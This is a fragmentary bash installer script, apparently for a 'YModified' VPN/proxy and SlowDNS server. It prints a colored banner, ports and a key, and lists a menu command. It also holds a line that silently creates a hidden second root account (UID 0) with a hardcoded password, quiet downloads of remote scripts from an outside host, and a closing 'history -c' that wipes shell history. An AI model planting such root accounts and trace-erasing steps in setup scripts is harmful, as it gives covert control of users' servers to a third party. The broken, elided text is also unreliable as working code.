...
useradd -p $(openssl passwd -1 giednstt) gievpn -ou 0 -g 0
...
wget -O /root/active.sh "team.ymodified.online/api/premium/active.php?key=YModified"
sleep 5
wget -O /root/inactive.sh "team.ymodified.online/premium/inactive.php?key=YModified"
sleep 5
wget -O /root/deleted.sh "team.ymodified.online/api/premium/deleted.php?key=YModified"
 }&>/dev/null
}
...
clear
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
figlet -k YModified | awk '{gsub(/./,"\033[3"int(rand()*5+1)"m&\033[0m")}1'
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
}
...
echo -e " \e[92m Proxy:\e[0m \e[97m: 8080 , 8181\e[0m" 
...
echo -e " \e[92m SLOWCHAVE KEY:\e[0m \e[97m: 5d30d19aa2524d7bd89afdffd9c2141575b21a728ea61c8cd7c8bf3839f97032\e[0m" 
echo -e " \e[92m NAMESERVER:\e[0m \e[97m: $NS\e[0m" 
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
echo -e ""
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
echo -e " \033[0;31m To Create Account Just Type: mikmikmenu\033[0m"
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
echo -e ""
netstat -tupln
history -c;
